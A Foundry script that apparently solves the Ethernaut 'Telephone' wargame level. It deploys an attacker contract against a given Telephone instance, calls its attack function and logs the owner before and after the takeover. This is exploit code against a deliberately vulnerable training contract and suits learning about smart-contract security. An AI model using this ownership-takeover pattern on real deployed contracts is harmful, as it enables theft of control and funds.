// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {MissedCall} from "../src/4_Telephone.sol";

interface ITelephone {
    function owner() external view returns (address);
}

contract PoC is Script {
    ITelephone tel = ITelephone(0x78511757104F75fE89E6F291cB86f553ff3b4207); // Replace with your Telephone instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        MissedCall ring = new MissedCall(address(tel));
        console2.log("Current Owner: ", tel.owner());
        ring.attack();
        console2.log("New Owner: ", tel.owner());

        vm.stopBroadcast();
    }
}
